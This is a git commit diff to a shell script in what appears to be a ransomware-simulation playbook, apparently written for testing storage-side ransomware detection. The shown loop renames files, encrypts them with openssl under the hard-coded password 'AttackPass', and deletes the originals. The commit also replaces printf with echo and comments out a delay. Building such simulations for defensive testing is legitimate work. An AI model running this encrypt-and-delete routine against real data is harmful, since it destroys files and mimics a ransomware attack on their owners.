2dac156f776e493b38136b095424a411c73aaa02
AdrianBronder <45482283+AdrianBronder@users.noreply.github.com>
2024-11-05 14:08:06 +0100

    adjusting scripts

--- playbooks/ONTAP-82/scripts/ONTAP-82-04.sh
+++ playbooks/ONTAP-82/scripts/ONTAP-82-04.sh
@@ -27,11 +27,11 @@ do
                 CWD=`pwd`
                 encrypt_filename1=$CWD/$file.processing.lckd
                 encrypt_filename2=$CWD/$file.lckd.$RANDOM
-                printf 'Encrypting:  %s\n' "$file"
+                echo 'Encrypting:  %s\n' "$file"
                 `mv $CWD/$file $encrypt_filename1 2> /dev/null` && `openssl enc -aes-256-cbc -salt -in $encrypt_filename1 -out $encrypt_filename2 -pass pass:AttackPass 2> /dev/null` && `rm $encrypt_filename1 2> /dev/null`
                 if [ -f "$encrypt_filename2" ]; then
                         echo ""
-                        sleep 1
+#                        sleep 1
                 else
                         echo "Encryption failed."
                 fi
